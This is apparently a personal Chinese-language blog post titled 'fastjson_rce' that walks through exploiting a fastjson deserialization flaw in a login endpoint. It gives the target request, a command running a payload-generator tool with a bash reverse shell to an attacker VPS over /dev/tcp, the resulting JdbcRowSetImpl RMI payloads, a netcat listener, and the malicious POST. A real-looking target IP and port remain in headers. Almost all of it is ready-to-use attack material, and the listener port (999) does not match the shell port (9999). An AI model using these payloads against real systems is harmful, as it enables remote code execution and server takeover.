---
title: fastjson_rce
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2021-01-29 16:09:51
top:
tags:
layout:
---
编写进度
- [x] 

# 漏洞url #
http://x.x.x.x/demo/login 
```shell
POST /demo/login HTTP/1.1
Host: x.x.x.x
Content-Length: 35
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/json
Origin: http://106.14.21.5:31180
Referer: http://106.14.21.5:31180/demo/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510
Connection: close

{"name":"admin","password":"admin"}
```

# 利用 #

## 在vps(47.106.65.x)上生成payload ##
[fastjson_tool.jar](https://github.com/wyzxxz/fastjson_rce_tool)

```shell
java -cp /tmp/fastjson_tool.jar fastjson.HRMIServer 47.106.65.x 1099 "bash=bash -i >& /dev/tcp/47.106.65.x/9999 0>&1"

[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://47.106.65.x:1099/Object","autoCommit":true}
[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://47.106.65.x:1099/Object","autoCommit":true}}
[-] Opening JRMP listener on 1099
...
```

## 在vps上监听999端口 ##

``` shell
nc -lvvp 999
```

## 发送payload ##
```shell
POST /demo/login HTTP/1.1
Host: x.x.x.x
Content-Length: 184
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/json
Origin: http://x.x.x.x
Referer: http://x.x.x.x/demo/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510
Connection: close

{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://47.106.65.x:1099/Object","autoCommit":true}}

```

